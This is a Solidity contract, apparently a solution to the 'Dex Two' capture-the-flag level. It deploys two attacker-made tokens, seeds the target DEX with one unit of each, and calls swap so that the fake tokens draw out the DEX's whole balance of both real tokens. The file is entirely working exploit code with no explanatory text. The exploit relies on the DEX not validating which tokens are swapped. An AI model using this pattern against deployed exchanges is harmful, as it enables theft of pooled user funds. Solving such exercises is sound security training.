// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import './IDexTwo.sol';
import './SwappableTokenTwo.sol';

contract DexTwoExploit {
    using SafeMath for uint;
    SwappableTokenTwo public exploitToken1;
    SwappableTokenTwo public exploitToken2;
    IERC20 public token1;
    IERC20 public token2;
    IDexTwo public dex;

    constructor(address _token1,address _token2, address _dex) public {
        exploitToken1= new SwappableTokenTwo(_dex,"Exploiter1","EXP1",100);
        exploitToken2= new SwappableTokenTwo(_dex,"Exploiter2","EXP2",100);
        token1=IERC20(_token1);
        token2=IERC20(_token2);
        dex=IDexTwo(_dex);

        token1.approve(_dex, uint256(0)-1);
        token2.approve(_dex, uint256(0)-1);
        exploitToken1.transfer(_dex, 1);
        exploitToken2.transfer(_dex, 1);
        exploitToken1.approve(address(this), _dex, uint256(0)-1);
        exploitToken2.approve(address(this), _dex, uint256(0)-1);
    }

    function getDexToken1Balance() public view returns(uint256){
        return  token1.balanceOf(address(dex));
    }

    function getDexToken2Balance() public view returns(uint256){
        return  token2.balanceOf(address(dex));
    }

    function getToken1Balance() public view returns(uint256){
        return token1.balanceOf(address(this));
    }

    function getToken2Balance() public view returns(uint256){
        return token2.balanceOf(address(this));
    }

    function exploit() public{
        dex.swap(address(exploitToken1), address(token1),1);
        dex.swap(address(exploitToken2), address(token2),1);
    }

  
}

